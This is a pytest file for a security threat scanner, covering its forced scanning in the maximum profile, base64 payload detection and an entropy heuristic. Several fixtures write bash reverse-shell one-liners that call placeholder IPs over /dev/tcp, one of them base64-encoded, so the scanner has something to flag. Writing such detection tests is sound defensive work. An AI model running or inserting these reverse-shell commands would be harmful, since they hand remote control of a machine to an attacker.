"""Threat-scanner hardening tests (Wave 4 Step 4 / item 2.5).

Covers the three new behaviors layered onto ``scan_workspace_for_threats``:

* mandatory scan in ``maximum`` profile (``is_scan_required``),
* base64-encoded payload detection,
* Shannon-entropy heuristic for high-entropy binaries.
"""

from __future__ import annotations

import base64
import os
import secrets
from pathlib import Path

import pytest

from nexus.security.threat_scanner import (
    is_scan_required,
    scan_workspace_for_threats,
)


# ---------------------------------------------------------------------------
# is_scan_required
# ---------------------------------------------------------------------------

def test_max_profile_forces_scan_even_when_disabled():
    assert is_scan_required("maximum", enable_task_scanning=False) is True


def test_other_profiles_honour_toggle():
    assert is_scan_required("standard", enable_task_scanning=True) is True
    assert is_scan_required("standard", enable_task_scanning=False) is False
    assert is_scan_required("relaxed", enable_task_scanning=False) is False


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

@pytest.fixture
def workspace(tmp_path):
    def _write(name: str, content: str | bytes) -> Path:
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, str):
            p.write_text(content, encoding="utf-8")
        else:
            p.write_bytes(content)
        return p

    return tmp_path, _write


# ---------------------------------------------------------------------------
# Direct regex pass (existing behavior, sanity)
# ---------------------------------------------------------------------------

def _run(coro):
    """Drive a coroutine to completion in a fresh event loop."""
    import asyncio

    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


def test_clean_workspace_returns_no_findings(workspace):
    tmp, write = workspace
    write("main.py", "print('hello')\n")
    findings = _run(scan_workspace_for_threats(str(tmp), profile="standard"))
    assert findings == []


def test_reverse_shell_pattern_flagged(workspace):
    tmp, write = workspace
    write("payload.sh", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n")
    findings = _run(scan_workspace_for_threats(str(tmp), profile="standard"))
    assert any(f["threat"] == "reverse_shell" for f in findings)


# ---------------------------------------------------------------------------
# Base64-encoded payload detection
# ---------------------------------------------------------------------------

def test_base64_encoded_reverse_shell_flagged(workspace):
    tmp, write = workspace
    payload = "bash -i >& /dev/tcp/9.9.9.9/4444 0>&1\n"
    encoded = base64.b64encode((payload * 4).encode()).decode()
    write(
        "loader.py",
        "import base64\n"
        f"BLOB = '{encoded}'\n"
        "print(BLOB)\n",
    )
    findings = _run(scan_workspace_for_threats(str(tmp), profile="standard"))
    threats = {f["threat"] for f in findings}
    assert "encoded_reverse_shell" in threats


def test_short_base64_not_decoded(workspace):
    """Short base64-looking strings are ignored to avoid false positives."""
    tmp, write = workspace
    write("ok.py", "TOKEN = 'YWJjZGVm'\nprint(TOKEN)\n")
    findings = _run(scan_workspace_for_threats(str(tmp), profile="standard"))
    assert findings == []


def test_base64_garbage_does_not_false_positive(workspace):
    tmp, write = workspace
    garbage = base64.b64encode(secrets.token_bytes(256)).decode()
    write("data.py", f"BLOB = '{garbage}'\n")
    findings = _run(scan_workspace_for_threats(str(tmp), profile="standard"))
    assert findings == []


# ---------------------------------------------------------------------------
# Entropy heuristic (maximum profile only)
# ---------------------------------------------------------------------------

def test_entropy_flagged_in_max_profile(workspace):
    tmp, write = workspace
    write("packed.bin", secrets.token_bytes(128 * 1024))
    findings = _run(scan_workspace_for_threats(str(tmp), profile="maximum"))
    assert any(f["threat"] == "high_entropy_binary" for f in findings)


def test_entropy_not_flagged_in_standard_profile(workspace):
    tmp, write = workspace
    write("packed.bin", secrets.token_bytes(128 * 1024))
    findings = _run(scan_workspace_for_threats(str(tmp), profile="standard"))
    assert findings == []


def test_small_binary_not_flagged_for_entropy(workspace):
    """Files below the 64 KB minimum are skipped."""
    tmp, write = workspace
    write("small.bin", secrets.token_bytes(8 * 1024))
    findings = _run(scan_workspace_for_threats(str(tmp), profile="maximum"))
    assert findings == []


def test_low_entropy_binary_not_flagged(workspace):
    """A predictable byte stream (low entropy) is not flagged."""
    tmp, write = workspace
    write("zeros.bin", b"\x00" * (128 * 1024))
    findings = _run(scan_workspace_for_threats(str(tmp), profile="maximum"))
    assert findings == []


# ---------------------------------------------------------------------------
# Larger reads for risky extensions
# ---------------------------------------------------------------------------

def test_threat_in_5mb_python_file_still_caught(workspace):
    """Risky extensions are scanned up to 8 MB, not just 1 MB."""
    tmp, write = workspace
    padding = "# benign comment line\n" * 200_000  # ~4 MB of padding
    # /dev/tcp/ matches the reverse_shell regex regardless of language.
    write("big.py", padding + "os.system('cat </dev/tcp/1.2.3.4/4444')\n")
    findings = _run(scan_workspace_for_threats(str(tmp), profile="standard"))
    assert any(f["threat"] == "reverse_shell" for f in findings)
